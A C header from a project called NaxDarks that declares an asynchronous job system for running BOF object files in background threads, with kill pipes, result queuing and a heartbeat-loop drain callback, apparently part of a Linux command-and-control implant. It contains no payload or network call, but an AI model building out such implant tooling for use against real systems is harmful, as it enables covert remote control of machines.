/* bof_async.h — Async BOF job infrastructure for NaxDarks
 * Provides thread-based background BOF execution with output queuing.
 */

#ifndef BOF_ASYNC_H
#define BOF_ASYNC_H

#include <stdint.h>
#include <pthread.h>

#define MAX_ASYNC_JOBS 8

/* Result status codes — mirrored from nax_linux.h to avoid that dependency */
#ifndef NAX_STATUS_OK
#define NAX_STATUS_OK  0x00u
#endif
#ifndef NAX_STATUS_ERR
#define NAX_STATUS_ERR 0x01u
#endif

typedef enum {
    NAX_JOB_FREE      = 0,  /* slot available */
    NAX_JOB_RUNNING   = 1,  /* thread executing BOF */
    NAX_JOB_COMPLETED = 2   /* done, waiting for drain */
} async_job_state_t;

typedef struct {
    /* Config (set before thread starts, read-only after) */
    uint8_t  *bof_data;       /* deep copy of ELF .o */
    uint32_t  bof_size;
    uint8_t  *args_data;      /* deep copy of packed args */
    uint32_t  args_size;
    uint32_t  task_id;        /* for result delivery */

    /* Runtime */
    pthread_t         thread;
    async_job_state_t state;      /* explicit slot state */
    int               stop_pipe[2]; /* [0]=read (BOF polls), [1]=write (kill signal) */

    /* Result (written by thread, read by main loop) */
    char     *output;
    uint32_t  output_len;
    uint8_t   status;         /* NAX_STATUS_OK / NAX_STATUS_ERR */

    /* Kill flag — set by nax_async_kill() under g_jobs_lock.
     * The worker checks this before writing state=COMPLETED so that
     * a killed job never delivers its result to drain() and the slot
     * is freed immediately by the worker itself. */
    volatile int killed;
} async_job_t;

/* Initialize the async job system (call once at startup) */
void nax_async_init(void);

/* Start a BOF in a background thread. Returns job index (0-based) or -1 on error.
 * bof_data/args_data are deep-copied internally — caller can free originals. */
int nax_async_start(uint32_t task_id,
                    const uint8_t *bof_data, uint32_t bof_size,
                    const uint8_t *args_data, uint32_t args_size);

/* Check for completed async jobs and invoke callback for each.
 * callback(task_id, status, output, output_len, user_data)
 * Called from the heartbeat loop. */
typedef void (*async_result_cb)(uint32_t task_id, uint8_t status,
                                 const char *output, uint32_t output_len,
                                 void *user_data);
void nax_async_drain(async_result_cb cb, void *user_data);

/* Kill a running async job by index. Returns 0 on success. */
int nax_async_kill(int job_idx);

/* List active jobs. Writes formatted text to buf. Returns length. */
int nax_async_list(char *buf, int cap);

/* Get the stop-poll fd for the current async BOF thread (or -1 if sync). */
int nax_async_get_stop_fd(void);

#endif /* BOF_ASYNC_H */
